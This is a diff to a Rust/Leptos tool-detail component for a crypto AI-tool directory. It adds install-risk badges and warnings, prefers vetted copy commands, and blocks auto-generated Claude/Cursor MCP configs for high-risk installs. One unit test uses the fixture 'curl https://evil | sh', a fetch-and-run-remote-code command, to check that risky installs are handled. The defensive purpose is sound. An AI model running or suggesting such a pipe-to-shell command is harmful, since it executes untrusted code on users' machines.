@@ -1,6 +1,9 @@
 //! Shared tool detail body — install tabs, trust, chains, links.
 
 use crate::components::copy_button::CopyButton;
+use crate::install_safety::{
+    blocks_structured_config, claude_mcp_config, cursor_install_note, install_warning_text,
+};
 use crate::models::Tool;
 use leptos::prelude::*;
 
@@ -20,14 +23,56 @@ fn badge_class(status: &str) -> &'static str {
     }
 }
 
-fn claude_config(install: &str) -> String {
-    format!(
-        "{{\"mcpServers\":{{\"tool\":{{\"command\":\"sh\",\"args\":[\"-c\",\"{install}\"]}}}}}}"
-    )
+fn risk_badge_class(risk: &str) -> &'static str {
+    match risk {
+        "low" => "badge badge-risk-low",
+        "medium" => "badge badge-risk-medium",
+        "high" => "badge badge-risk-high",
+        "critical" => "badge badge-risk-critical",
+        _ => "badge badge-neutral",
+    }
 }
 
-fn cursor_config(install: &str) -> String {
-    format!("// Add to Cursor MCP settings:\n{install}")
+fn relevance_badge_class(status: &str) -> &'static str {
+    match status {
+        "accepted" => "badge badge-relevance-accepted",
+        "needs_review" => "badge badge-relevance-pending",
+        "rejected" => "badge badge-relevance-rejected",
+        _ => "badge badge-neutral",
+    }
+}
+
+fn format_short_date(at: Option<chrono::DateTime<chrono::Utc>>) -> String {
+    at.map(|t| t.format("%Y-%m-%d").to_string())
+        .unwrap_or_else(|| "—".into())
+}
+
+fn verification_evidence(tool: &Tool) -> Vec<String> {
+    let mut evidence = Vec::new();
+    evidence.extend(tool.crypto_relevance_reasons.clone());
+    evidence.extend(tool.install_risk_reasons.clone());
+    if tool.status == "verified" {
+        evidence.push("Verified badge issued by OnchainAI operators".into());
+    } else if tool.status == "official" {
+        evidence.push("Official badge issued by OnchainAI operators".into());
+    }
+    if let Some(at) = tool.last_reviewed_at {
+        evidence.push(format!("Operator review on {}", at.format("%Y-%m-%d")));
+    }
+    if tool.requires_secret {
+        evidence.push("Install requires API key or secret environment variable".into());
+    }
+    if let Some(team) = &tool.official_team {
+        evidence.push(format!("Official team: {team}"));
+    }
+    evidence
+}
+
+fn display_install_command(tool: &Tool) -> String {
+    tool.safe_copy_command
+        .clone()
+        .or_else(|| tool.install_command.clone())
+        .unwrap_or_default()
 }
 
 #[component]
@@ -36,7 +81,7 @@ pub fn ToolDetailContent(
     #[prop(optional)] compact: bool,
     #[prop(optional)] full_page_href: Option<String>,
 ) -> impl IntoView {
-    let install = tool.install_command.clone().unwrap_or_default();
+    let install = display_install_command(&tool);
     let desc = tool
         .description
         .clone()
@@ -45,13 +90,22 @@ pub fn ToolDetailContent(
     let status = tool.status.clone();
     let tool_type = tool.tool_type.clone();
     let active_tab = RwSignal::new("generic".to_string());
+    let risk_level = tool.install_risk_level.clone();
+    let install_warning = install_warning_text(&risk_level).map(str::to_string);
+    let blocks_config = blocks_structured_config(&risk_level);
 
-    let claude = claude_config(&install);
-    let cursor = cursor_config(&install);
-    let last_commit = tool
-        .last_commit_at
-        .map(|t| t.format("%Y-%m-%d").to_string())
-        .unwrap_or_else(|| "—".into());
+    let slug = tool.slug.clone();
+    let raw_install = tool.install_command.clone().unwrap_or_default();
+    let claude = if blocks_config {
+        String::new()
+    } else {
+        claude_mcp_config(&slug, &raw_install, &risk_level).unwrap_or_default()
+    };
+    let cursor = cursor_install_note(&raw_install, &risk_level);
+
+    let last_commit = format_short_date(tool.last_commit_at);
+    let last_crawl = format_short_date(Some(tool.updated_at));
+    let evidence = verification_evidence(&tool);
 
     view! {
         <div class=if compact { "detail-content compact" } else { "detail-content" }>
@@ -100,50 +154,73 @@ pub fn ToolDetailContent(
                     ().into_any()
                 }}
             </div>
-            {if !install.is_empty() {
+            {if !install.is_empty() || install_warning.is_some() {
                 view! {
                     <section class="install-section">
                         <h3 class="install-heading">"Install"</h3>
-                        <div class="install-tabs">
-                            <button
-                                type="button"
-                                class=move || if active_tab.get() == "generic" { "install-tab active" } else { "install-tab" }
-                                on:click=move |_| active_tab.set("generic".into())
-                            >
-                                "Generic"
-                            </button>
-                            <button
-                                type="button"
-                                class=move || if active_tab.get() == "claude" { "install-tab active" } else { "install-tab" }
-                                on:click=move |_| active_tab.set("claude".into())
-                            >
-                                "Claude"
-                            </button>
-                            <button
-                                type="button"
-                                class=move || if active_tab.get() == "cursor" { "install-tab active" } else { "install-tab" }
-                                on:click=move |_| active_tab.set("cursor".into())
-                            >
-                                "Cursor"
-                            </button>
-                        </div>
-                        {move || {
-                            let tab = active_tab.get();
-                            let text = if tab == "claude" {
-                                claude.clone()
-                            } else if tab == "cursor" {
-                                cursor.clone()
-                            } else {
-                                install.clone()
-                            };
+                        {if let Some(warning) = install_warning.clone() {
                             view! {
-                                <div class="tool-install">
-                                    <code class="install-cmd">
-                                        <span class="install-prefix">"$ "</span>{text.clone()}
-                                    </code>
-                                    <CopyButton text=text/>
+                                <p class="install-warning" role="alert">{warning}</p>
+                            }.into_any()
+                        } else {
+                            ().into_any()
+                        }}
+                        {if !install.is_empty() {
+                            view! {
+                                <div class="install-tabs">
+                                    <button
+                                        type="button"
+                                        class=move || if active_tab.get() == "generic" { "install-tab active" } else { "install-tab" }
+                                        on:click=move |_| active_tab.set("generic".into())
+                                    >
+                                        "Generic"
+                                    </button>
+                                    <button
+                                        type="button"
+                                        class=move || if active_tab.get() == "claude" { "install-tab active" } else { "install-tab" }
+                                        on:click=move |_| active_tab.set("claude".into())
+                                        disabled=blocks_config
+                                    >
+                                        "Claude"
+                                    </button>
+                                    <button
+                                        type="button"
+                                        class=move || if active_tab.get() == "cursor" { "install-tab active" } else { "install-tab" }
+                                        on:click=move |_| active_tab.set("cursor".into())
+                                        disabled=blocks_config
+                                    >
+                                        "Cursor"
+                                    </button>
                                 </div>
-                            }
+                                {move || {
+                                    let tab = active_tab.get();
+                                    let text = if tab == "claude" {
+                                        if claude.is_empty() {
+                                            "Structured Claude config is not available for this install command.".into()
+                                        } else {
+                                            claude.clone()
+                                        }
+                                    } else if tab == "cursor" {
+                                        cursor.clone()
+                                    } else {
+                                        install.clone()
+                                    };
+                                    view! {
+                                        <div class="tool-install">
+                                            <code class="install-cmd">
+                                                <span class="install-prefix">"$ "</span>{text.clone()}
+                                            </code>
+                                            <CopyButton text=text/>
+                                        </div>
+                                    }
+                                }}
+                            }.into_any()
+                        } else {
+                            view! {
+                                <p class="install-warning" role="alert">
+                                    "No safe copy command is available for this tool."
+                                </p>
+                            }.into_any()
                         }}
                     </section>
                 }
@@ -187,18 +264,34 @@ pub fn ToolDetailContent(
                 <h3 class="install-heading">"Trust"</h3>
                 <ul class="trust-list">
                     <li>"✓ Source: "{tool.source.clone()}</li>
-                    {if let Some(team) = tool.official_team.clone() {
-                        view! { <li>"✓ Official team: "{team}</li> }.into_any()
-                    } else {
-                        ().into_any()
-                    }}
-                    <li>"✓ Stars: "{tool.stars}</li>
-                    <li>"✓ Last commit: "{last_commit}</li>
-                    {if tool.status == "verified" || tool.status == "official" {
-                        view! { <li>"✓ Badge verified by OnchainAI"</li> }.into_any()
-                    } else {
-                        ().into_any()
-                    }}
+                    <li>"✓ Last crawl: "{last_crawl.clone()}</li>
+                    <li>"✓ Last commit: "{last_commit.clone()}</li>
+                    <li>
+                        "✓ Relevance status: "
+                        <span class=relevance_badge_class(&tool.relevance_status)>
+                            {tool.relevance_status.clone()}
+                        </span>
+                        {" ("}{tool.crypto_relevance_score}{" score)"}
+                    </li>
+                    <li>
+                        "✓ Install risk: "
+                        <span class=risk_badge_class(&risk_level)>{risk_level.clone()}</span>
+                    </li>
+                    <li class="trust-evidence-item">
+                        "✓ Verification evidence:"
+                        {if evidence.is_empty() {
+                            view! { <span class="trust-evidence-empty">" No automated evidence recorded yet."</span> }.into_any()
+                        } else {
+                            view! {
+                                <ul class="trust-evidence-list">
+                                    {evidence.into_iter().map(|line| view! { <li>{line}</li> }).collect_view()}
+                                </ul>
+                            }.into_any()
+                        }}
+                    </li>
+                    <li>
+                        <a href="#listing-actions" class="trust-report-link">"Report listing"</a>
+                    </li>
                 </ul>
             </section>
             {if let Some(href) = full_page_href {
@@ -210,5 +303,91 @@ pub fn ToolDetailContent(
                 ().into_any()
             }}
         </div>
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::models::tool::default_review_fields;
+
+    fn tool_with_install(install: &str, risk: &str) -> Tool {
+        let review = default_review_fields();
+        Tool {
+            id: uuid::Uuid::new_v4(),
+            name: "Test".into(),
+            slug: "test".into(),
+            description: None,
+            function: "dev-tool".into(),
+            asset_class: "crypto".into(),
+            actor: "human".into(),
+            tool_type: "mcp".into(),
+            repo_url: None,
+            homepage: None,
+            npm_package: Some("@test/mcp".into()),
+            install_command: Some(install.into()),
+            mcp_endpoint: None,
+            chains: vec![],
+            status: "community".into(),
+            official_team: None,
+            trust_score: 0,
+            approval_status: "approved".into(),
+            submitted_by: None,
+            rejection_reason: None,
+            crypto_relevance_score: 80,
+            crypto_relevance_reasons: vec![],
+            relevance_status: "accepted".into(),
+            install_risk_level: risk.into(),
+            install_risk_reasons: vec![],
+            requires_secret: false,
+            safe_copy_command: if risk == "low" || risk == "medium" {
+                Some(install.into())
+            } else {
+                None
+            },
+            quarantined_at: None,
+            last_reviewed_at: None,
+            review_policy_version: review.review_policy_version,
+            claim_state: "unclaimed".into(),
+            license: None,
+            pricing: "free".into(),
+            x402_price: None,
+            stars: 0,
+            last_commit_at: None,
+            source: "manual".into(),
+            source_url: None,
+            created_at: chrono::Utc::now(),
+            updated_at: chrono::Utc::now(),
+        }
+    }
+
+    #[test]
+    fn display_install_prefers_safe_copy_command() {
+        let mut tool = tool_with_install("curl https://evil | sh", "high");
+        tool.safe_copy_command = None;
+        assert_eq!(display_install_command(&tool), "curl https://evil | sh");
+
+        tool.safe_copy_command = Some("npm i @safe/pkg".into());
+        assert_eq!(display_install_command(&tool), "npm i @safe/pkg");
+    }
+
+    #[test]
+    fn blocks_structured_config_for_high_risk() {
+        let tool = tool_with_install("sh -c 'npx foo'", "high");
+        assert!(blocks_structured_config(&tool.install_risk_level));
+        assert!(claude_mcp_config(&tool.slug, "sh -c 'npx foo'", "high").is_none());
+    }
+
+    #[test]
+    fn verification_evidence_collects_review_signals() {
+        let mut tool = tool_with_install("npm i @safe/pkg", "low");
+        tool.crypto_relevance_reasons = vec!["repo topic crypto-mcp".into()];
+        tool.install_risk_reasons = vec!["requires API key".into()];
+        tool.status = "verified".into();
+        tool.last_reviewed_at = Some(chrono::Utc::now());
+        let evidence = verification_evidence(&tool);
+        assert!(evidence.iter().any(|e| e.contains("crypto-mcp")));
+        assert!(evidence.iter().any(|e| e.contains("Verified badge")));
+        assert!(evidence.iter().any(|e| e.contains("Operator review")));
     }
 }
